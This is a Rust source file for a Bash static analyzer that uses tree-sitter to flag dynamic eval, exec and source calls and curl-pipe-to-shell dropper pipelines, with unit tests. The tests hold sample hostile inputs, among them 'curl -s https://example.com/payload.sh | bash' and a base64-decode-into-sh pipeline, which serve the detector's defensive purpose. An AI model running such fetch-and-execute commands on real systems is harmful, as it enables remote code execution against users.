//! Bash/shell AST walker — tree-sitter-bash based checks for dynamic
//! execution, dynamic imports, and shell-pipe dropper patterns.
//!
//! The walker detects a small, high-signal set of dangerous patterns
//! commonly used in supply-chain attacks and obfuscated shell scripts:
//!
//!   * `eval <arg>` where the argument contains a variable expansion or
//!     command substitution → DynamicExecution CRITICAL.
//!   * `eval <literal>` where the argument is a plain string with no
//!     interpolation → DynamicExecution WARN (eval of any string is risky).
//!   * `exec <non-literal>` — process replacement via a dynamic path/name
//!     → DynamicExecution CRITICAL.
//!   * `source <non-literal>` / `. <non-literal>` — sourcing a dynamic
//!     path → DynamicImport WARN.
//!   * Pipeline ending with `bash`/`sh`/`dash`/`zsh` — the classic
//!     `curl ... | bash` or `echo payload | base64 -d | bash` dropper
//!     pattern → DynamicExecution WARN.

use std::path::Path;

use tree_sitter::{Node, Parser};

use super::AstOutcome;
use crate::finding::{redact_snippet, Finding, PassKind, Severity, SignalKind};
use crate::util::{snippet_around, LineIndex};

pub fn analyze(path: &Path, bytes: &[u8]) -> AstOutcome {
    let mut parser = Parser::new();
    if parser
        .set_language(&tree_sitter_bash::LANGUAGE.into())
        .is_err()
    {
        return AstOutcome {
            findings: Vec::new(),
            parse_error: Some("tree-sitter: set_language failed".into()),
            file_flags: Default::default(),
        };
    }
    let Some(tree) = parser.parse(bytes, None) else {
        return AstOutcome {
            findings: Vec::new(),
            parse_error: Some("tree-sitter: parse returned None".into()),
            file_flags: Default::default(),
        };
    };
    let root = tree.root_node();
    let parse_error = if root.has_error() {
        Some("tree-sitter: partial parse (errors present)".into())
    } else {
        None
    };
    let index = LineIndex::new(bytes);
    let mut findings = Vec::new();
    walk(root, bytes, path, &index, &mut findings);
    AstOutcome {
        findings,
        parse_error,
        file_flags: Default::default(),
    }
}

fn walk(root: Node, bytes: &[u8], path: &Path, index: &LineIndex, findings: &mut Vec<Finding>) {
    let mut stack = vec![root];
    while let Some(node) = stack.pop() {
        match node.kind() {
            "command" => check_command(node, bytes, path, index, findings),
            "pipeline" => check_pipeline(node, bytes, path, index, findings),
            _ => {}
        }
        for i in (0..node.child_count() as u32).rev() {
            if let Some(child) = node.child(i) {
                stack.push(child);
            }
        }
    }
}

// ---------------------------------------------------------------------------
// Command-level analysis
// ---------------------------------------------------------------------------

fn check_command(
    node: Node,
    bytes: &[u8],
    path: &Path,
    index: &LineIndex,
    findings: &mut Vec<Finding>,
) {
    let Some(name_node) = node.child_by_field_name("name") else {
        return;
    };
    let name = command_name_text(name_node, bytes);

    match name.as_deref() {
        Some("eval") => {
            // Collect all argument nodes.
            let args = command_arguments(node);
            if let Some(first_arg) = args.first() {
                check_eval_arg(node, *first_arg, bytes, path, index, findings);
            }
        }
        Some("exec") => {
            let args = command_arguments(node);
            if let Some(first_arg) = args.first() {
                if is_dynamic_expression(*first_arg, bytes) {
                    emit_dynamic_exec(node, bytes, path, index, findings, "exec");
                }
            }
        }
        Some("source") | Some(".") => {
            let args = command_arguments(node);
            if let Some(first_arg) = args.first() {
                if is_dynamic_expression(*first_arg, bytes) {
                    emit_dynamic_source(node, bytes, path, index, findings);
                }
            }
        }
        _ => {}
    }
}

fn check_eval_arg(
    cmd_node: Node,
    arg: Node,
    bytes: &[u8],
    path: &Path,
    index: &LineIndex,
    findings: &mut Vec<Finding>,
) {
    if is_dynamic_expression(arg, bytes) {
        // Variable expansion or command substitution reaches eval.
        let off = cmd_node.start_byte();
        let (line, col) = index.locate(off);
        findings.push(Finding {
            path: path.to_path_buf(),
            byte_offset: off,
            line,
            col,
            pass: PassKind::Ast,
            kind: SignalKind::DynamicExecution,
            severity: Severity::Critical,
            confidence: 0.90,
            message: "`eval` called on a dynamic (variable/substitution) expression".to_string(),
            snippet: redact_snippet(&snippet_around(bytes, off, 100)),
            diff_introduced: false,
        });
    } else {
        // Literal string passed to eval — still a code-execution risk.
        let off = cmd_node.start_byte();
        let (line, col) = index.locate(off);
        findings.push(Finding {
            path: path.to_path_buf(),
            byte_offset: off,
            line,
            col,
            pass: PassKind::Ast,
            kind: SignalKind::DynamicExecution,
            severity: Severity::Warn,
            confidence: 0.70,
            message: "`eval` called on a string literal".to_string(),
            snippet: redact_snippet(&snippet_around(bytes, off, 100)),
            diff_introduced: false,
        });
    }
}

fn emit_dynamic_exec(
    cmd_node: Node,
    bytes: &[u8],
    path: &Path,
    index: &LineIndex,
    findings: &mut Vec<Finding>,
    fn_name: &str,
) {
    let off = cmd_node.start_byte();
    let (line, col) = index.locate(off);
    findings.push(Finding {
        path: path.to_path_buf(),
        byte_offset: off,
        line,
        col,
        pass: PassKind::Ast,
        kind: SignalKind::DynamicExecution,
        severity: Severity::Critical,
        confidence: 0.85,
        message: format!("`{}` called with a dynamic (variable/substitution) path", fn_name),
        snippet: redact_snippet(&snippet_around(bytes, off, 100)),
        diff_introduced: false,
    });
}

fn emit_dynamic_source(
    cmd_node: Node,
    bytes: &[u8],
    path: &Path,
    index: &LineIndex,
    findings: &mut Vec<Finding>,
) {
    let off = cmd_node.start_byte();
    let (line, col) = index.locate(off);
    findings.push(Finding {
        path: path.to_path_buf(),
        byte_offset: off,
        line,
        col,
        pass: PassKind::Ast,
        kind: SignalKind::DynamicImport,
        severity: Severity::Warn,
        confidence: 0.75,
        message: "`source` called with a dynamic path — sourcing a variable script path"
            .to_string(),
        snippet: redact_snippet(&snippet_around(bytes, off, 100)),
        diff_introduced: false,
    });
}

// ---------------------------------------------------------------------------
// Pipeline analysis — detect `... | bash` / `... | sh` dropper pattern
// ---------------------------------------------------------------------------

/// Shell interpreters that, when appearing as the last command of a pipeline,
/// indicate the piped data is being executed as code.
const SHELL_INTERPRETERS: &[&str] = &["bash", "sh", "dash", "zsh", "ksh"];

fn check_pipeline(
    node: Node,
    bytes: &[u8],
    path: &Path,
    index: &LineIndex,
    findings: &mut Vec<Finding>,
) {
    // Collect the named child commands of the pipeline in order.
    let mut cursor = node.walk();
    let commands: Vec<Node> = node
        .children(&mut cursor)
        .filter(|c| c.is_named())
        .collect();

    // We need at least two stages (something | shell-interpreter).
    if commands.len() < 2 {
        return;
    }

    // Check if the last stage is a bare shell interpreter invocation.
    let last = commands[commands.len() - 1];
    if last.kind() != "command" {
        return;
    }
    let Some(name_node) = last.child_by_field_name("name") else {
        return;
    };
    let name = command_name_text(name_node, bytes);
    let is_shell = name
        .as_deref()
        .map(|n| SHELL_INTERPRETERS.contains(&n))
        .unwrap_or(false);
    if !is_shell {
        return;
    }

    let off = node.start_byte();
    let (line, col) = index.locate(off);
    findings.push(Finding {
        path: path.to_path_buf(),
        byte_offset: off,
        line,
        col,
        pass: PassKind::Ast,
        kind: SignalKind::DynamicExecution,
        severity: Severity::Warn,
        confidence: 0.80,
        message: format!(
            "pipeline feeds into `{}` — piped data is executed as shell code",
            name.as_deref().unwrap_or("shell")
        ),
        snippet: redact_snippet(&snippet_around(bytes, off, 100)),
        diff_introduced: false,
    });
}

// ---------------------------------------------------------------------------
// Node helpers
// ---------------------------------------------------------------------------

/// Extract the plain-text name from a `command_name` node (its first child).
fn command_name_text<'a>(name_node: Node<'a>, bytes: &'a [u8]) -> Option<String> {
    // command_name has a single unnamed child which is the word/identifier.
    let mut cursor = name_node.walk();
    for child in name_node.children(&mut cursor) {
        let text = node_text(child, bytes);
        if !text.is_empty() {
            return Some(text.to_string());
        }
    }
    None
}

fn node_text<'a>(node: Node, bytes: &'a [u8]) -> &'a str {
    std::str::from_utf8(&bytes[node.start_byte()..node.end_byte()]).unwrap_or("")
}

/// Collect the `argument` field children of a `command` node.
fn command_arguments<'a>(cmd_node: Node<'a>) -> Vec<Node<'a>> {
    let mut cursor = cmd_node.walk();
    let mut out = Vec::new();
    for child in cmd_node.children(&mut cursor) {
        if child.is_named() && child.kind() != "command_name" {
            out.push(child);
        }
    }
    out
}

/// Returns `true` if the expression contains a dynamic component: a variable
/// expansion (`$var`, `${var}`, `$1`) or a command substitution (`` `cmd` ``
/// / `$(cmd)`). A plain quoted or unquoted word is considered static/literal.
fn is_dynamic_expression(node: Node, bytes: &[u8]) -> bool {
    match node.kind() {
        // Variable expansion forms
        "simple_expansion" | "expansion" => true,
        // `$(cmd)` or `` `cmd` ``
        "command_substitution" => true,
        // Arithmetic expansion `$((...))`
        "arithmetic_expansion" => true,
        // A `string` node is dynamic if any of its children are expansions.
        "string" | "concatenation" => any_dynamic_child(node, bytes),
        _ => false,
    }
}

/// Returns `true` if any named or unnamed child of `node` is a dynamic expression.
fn any_dynamic_child(node: Node, bytes: &[u8]) -> bool {
    let mut cursor = node.walk();
    for child in node.children(&mut cursor) {
        if is_dynamic_expression(child, bytes) {
            return true;
        }
    }
    false
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::*;
    use std::path::PathBuf;

    fn run(src: &[u8]) -> Vec<Finding> {
        analyze(&PathBuf::from("test.sh"), src).findings
    }

    #[test]
    fn eval_of_variable_is_critical() {
        let findings = run(b"eval \"$cmd\"\n");
        let hit = findings
            .iter()
            .find(|f| f.kind == SignalKind::DynamicExecution)
            .expect("expected DynamicExecution finding");
        assert_eq!(hit.severity, Severity::Critical);
    }

    #[test]
    fn eval_of_command_substitution_is_critical() {
        let findings = run(b"eval $(cat payload)\n");
        let hit = findings
            .iter()
            .find(|f| f.kind == SignalKind::DynamicExecution)
            .expect("expected DynamicExecution finding");
        assert_eq!(hit.severity, Severity::Critical);
    }

    #[test]
    fn eval_of_literal_is_warn() {
        let findings = run(b"eval \"echo hello\"\n");
        let hit = findings
            .iter()
            .find(|f| f.kind == SignalKind::DynamicExecution)
            .expect("expected DynamicExecution finding");
        assert_eq!(hit.severity, Severity::Warn);
    }

    #[test]
    fn exec_of_variable_is_critical() {
        let findings = run(b"exec $binary\n");
        let hit = findings
            .iter()
            .find(|f| f.kind == SignalKind::DynamicExecution)
            .expect("expected DynamicExecution finding");
        assert_eq!(hit.severity, Severity::Critical);
    }

    #[test]
    fn source_of_variable_is_dynamic_import() {
        let findings = run(b"source $script\n");
        let hit = findings
            .iter()
            .find(|f| f.kind == SignalKind::DynamicImport)
            .expect("expected DynamicImport finding");
        assert_eq!(hit.severity, Severity::Warn);
    }

    #[test]
    fn dot_source_of_variable_is_dynamic_import() {
        let findings = run(b". $script\n");
        let hit = findings
            .iter()
            .find(|f| f.kind == SignalKind::DynamicImport)
            .expect("expected DynamicImport finding");
        assert_eq!(hit.severity, Severity::Warn);
    }

    #[test]
    fn pipeline_into_bash_is_warn() {
        let findings = run(b"curl -s https://example.com/payload.sh | bash\n");
        let hit = findings
            .iter()
            .find(|f| f.kind == SignalKind::DynamicExecution)
            .expect("expected DynamicExecution finding");
        assert_eq!(hit.severity, Severity::Warn);
        assert!(hit.message.contains("bash"));
    }

    #[test]
    fn pipeline_into_sh_is_warn() {
        let findings = run(b"echo 'aGVsbG8=' | base64 -d | sh\n");
        assert!(findings
            .iter()
            .any(|f| f.kind == SignalKind::DynamicExecution && f.severity == Severity::Warn));
    }

    #[test]
    fn clean_script_emits_no_findings() {
        let src = b"#!/bin/bash\nset -euo pipefail\necho \"Hello, World!\"\n";
        let findings = run(src);
        assert!(
            findings.is_empty(),
            "clean script produced findings: {:?}",
            findings
        );
    }

    #[test]
    fn parse_error_tolerated() {
        let result = analyze(&PathBuf::from("bad.sh"), b"eval $((\n");
        let _ = result.parse_error;
    }
}
